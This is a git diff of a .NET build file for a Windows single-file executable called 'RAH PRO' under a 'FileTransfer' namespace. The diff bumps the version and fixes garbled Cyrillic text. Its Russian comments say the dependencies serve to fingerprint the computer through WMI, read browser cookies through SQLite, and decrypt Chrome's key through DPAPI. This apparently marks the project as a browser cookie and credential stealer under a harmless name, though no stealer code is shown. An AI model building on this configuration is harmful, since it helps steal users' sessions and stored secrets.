@@ -1,4 +1,4 @@
-п»ї<Project Sdk="Microsoft.NET.Sdk">
+<Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>WinExe</OutputType>
     <TargetFramework>net8.0-windows</TargetFramework>
@@ -9,12 +9,12 @@
     <RootNamespace>FileTransfer</RootNamespace>
     <ApplicationManifest>app.manifest</ApplicationManifest>
     <ApplicationIcon>app.ico</ApplicationIcon>
-    <Version>7.4.0.0</Version>
-    <FileVersion>7.4.0.0</FileVersion>
-    <Company>РЈР±РµР¶РёС‰Рµ</Company>
+    <Version>7.4.5.0</Version>
+    <FileVersion>7.4.5.0</FileVersion>
+    <Company>Убежище</Company>
     <Product>RAH PRO</Product>
     <Description>RAH PRO</Description>
-    <Copyright>РЈР±РµР¶РёС‰Рµ</Copyright>
+    <Copyright>Убежище</Copyright>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
     <SelfContained>true</SelfContained>
     <PublishSingleFile>true</PublishSingleFile>
@@ -25,11 +25,11 @@
     <Resource Include="app.ico" />
   </ItemGroup>
   <ItemGroup>
-    <!-- WMI РґР»СЏ РїРѕР»СѓС‡РµРЅРёСЏ С…Р°СЂР°РєС‚РµСЂРёСЃС‚РёРє РєРѕРјРїСЊСЋС‚РµСЂР° -->
+    <!-- WMI для получения характеристик компьютера -->
     <PackageReference Include="System.Management" Version="8.0.0" />
-    <!-- SQLite РґР»СЏ С‡С‚РµРЅРёСЏ РєСѓРє Р±СЂР°СѓР·РµСЂРѕРІ -->
+    <!-- SQLite для чтения кук браузеров -->
     <PackageReference Include="Microsoft.Data.Sqlite" Version="9.0.3" />
-    <!-- DPAPI РґР»СЏ СЂР°СЃС€РёС„СЂРѕРІРєРё РєР»СЋС‡Р° Chrome -->
+    <!-- DPAPI для расшифровки ключа Chrome -->
     <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
   </ItemGroup>
 </Project>
